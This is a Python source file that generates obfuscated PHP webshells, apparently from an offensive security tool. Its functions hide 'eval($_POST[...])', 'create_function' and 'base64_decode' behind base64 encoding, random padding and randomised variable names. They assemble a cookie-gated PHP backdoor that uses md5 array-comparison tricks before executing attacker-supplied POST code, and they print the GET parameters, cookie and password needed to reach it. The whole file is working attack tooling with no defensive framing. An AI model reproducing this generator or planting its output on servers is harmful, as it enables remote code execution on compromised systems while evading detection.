"""  
@Time: 2024/3/6 16:04 
@Auth: Y5neKO
@File: general.py 
@IDE: PyCharm 
"""
import base64
import random
import string


def generate_random_string(length):
    """
    生成随机字符串
    :param length: 字符串长度
    :return: 随机字符串
    """
    non_numeric_characters = string.ascii_letters
    numeric_and_non_numeric_characters = string.ascii_letters + string.digits
    random_string = random.choice(non_numeric_characters)
    random_string += ''.join(random.choices(numeric_and_non_numeric_characters, k=length - 1))
    return random_string


def character_encode(str_string, lengths, longchar_characters=""):
    """
    用于生成混淆字符串，将随机字符串随机插入到原始字符串中
    :param str_string: 原始字符串
    :param lengths: 随机字符串的长度
    :param longchar_characters: 自定义字符串
    :return: 混淆后的字符串
    """
    encoding_string = ""
    if longchar_characters == "":
        longchar_characters = "".join(random.sample(string.ascii_letters + string.digits, lengths))  # 生成随机字符
    while True:
        rand_len = int(random.randint(1, 4))  # 返回1到4之间的整数
        if len(str_string) <= rand_len:
            encoding_string += str_string + longchar_characters
            break
        encoding_string += str_string[:rand_len] + longchar_characters
        str_string = str_string[rand_len:]
    return encoding_string, longchar_characters


# 用于生成Webshell的变量
variables = []
random_int = random.randint(10, 15)
cookie_name = generate_random_string(random_int)
cookie_value = generate_random_string(random_int)
value1 = "".join(random.sample(string.ascii_letters, random_int))
value2 = "".join(random.sample(string.ascii_letters, random_int))
zh_1 = "".join(random.sample(string.ascii_letters, random_int))
name_x_1 = "".join(random.sample(string.ascii_letters, random_int))
name_z_1 = "".join(random.sample(string.ascii_letters, random_int))
n_0 = "".join(random.sample(string.ascii_letters, random_int))
n_1 = "".join(random.sample(string.ascii_letters, random_int))
echo_1 = "".join(random.sample(string.ascii_letters, random_int))
echo_2 = "".join(random.sample(string.ascii_letters, random_int))
passwords = ''.join(random.sample(string.ascii_letters + string.digits, random.randint(10, 15)))
p1 = "".join(random.sample(string.ascii_letters, random_int))
p2 = "".join(random.sample(string.ascii_letters, random_int))

# 用于生成随机字符串列
for i in range(1, 99):
    if i == 10:
        variables.append(character_encode("str_replace", 50))
    elif i == 12:
        variables.append(character_encode("base64_decode", 50))
    elif i == 14:
        variables.append(character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50))
    elif i == 16:
        variables.append(character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50))
    elif i == 18:
        variables.append(character_encode(base64.b64encode(f"{passwords}".encode('utf-8')).decode('utf-8'), 50))
    elif i == 20:
        variables.append(character_encode(base64.b64encode("']);".encode('utf-8')).decode('utf-8'), 50))
    else:
        variable = generate_random_string(10)
        variables.append(variable)


def gen_php_webshell():
    """
    生成php版本webshell
    :return:
    """
    webshell = '<?php' + f' if ($_COOKIE[\'{cookie_name}\'] == "{cookie_value}") ' + '{' + f"""
    ${variables[0]} = 'str_r';
    ${variables[1]} = ${variables[0]}.'eplace';
    ${variables[2]} = substr(${variables[1]}, 7);
    ${variables[3]} = 's{variables[4]}t{variables[4]}r{variables[4]}_{variables[4]}r{variables[4]}e{variables[4]}p';
    if ($_GET['{variables[5]}'] !== $_GET['{variables[6]}'] && @md5($_GET['{variables[5]}']) === @md5($_GET['{variables[6]}']))""" + "{" + f"""
    ${variables[7]} = 'str_rep';
    ${variables[3]} = substr_replace('{variables[4]}',${variables[7]},${variables[3]});
    """ + "}" + "else{die();}" + f"""
    if (!($_POST['{p1}'] !== $_POST['{p2}'] && @md5($_POST['{p1}']) === @md5($_POST['{p2}'])))""" + "{die();}" + f"""
    ${variables[2]}=${variables[3]}.${variables[2]};
    ${variables[8]}=${variables[2]}("{variables[9][1]}", "", "{variables[9][0]}");
    ${variables[10]}=${variables[8]}("{variables[11][1]}", "", "{variables[11][0]}");
    ${variables[12]}=${variables[10]}(${variables[8]}("{variables[13][1]}", "", "{variables[13][0]}"));
    ${variables[14]}=${variables[10]}(${variables[8]}("{variables[15][1]}", "", "{variables[15][0]}"));
    ${variables[16]}=${variables[10]}(${variables[8]}("{variables[17][1]}", "", "{variables[17][0]}"));
    ${variables[18]}=${variables[10]}(${variables[8]}("{variables[19][1]}", "", "{variables[19][0]}"));
    @${value1}=${variables[14]};
    @$${value1}=${variables[16]};
    @${zh_1}=${value1}.$${value1};
    @${value2}=${zh_1};
    @$${value2}=${variables[18]};
    @${name_x_1}=${value2};
    @${name_z_1}=$${value2};
    @${n_0} = ${variables[12]}('${echo_1},${echo_2}','return "${echo_1}"."${echo_2}";');
    @${n_1}=${n_0}(${name_x_1},${name_z_1});
    @${variables[20]} = ${variables[12]}("", ${n_1});
    @${variables[20]}();
    """ + "} " + "?>"
    webshell = webshell.replace('\n', '')
    webshell = webshell.replace('    ', '')
    setting = "GET参数: " + variables[5] + "[]=2" + "&" + variables[6] + "[]=1\n" + "Cookie: " + cookie_name + "=" + cookie_value + "\n密码: " + f'{p1}[]=2&{p2}[]=1&{passwords}'
    result = [webshell, setting]
    return result
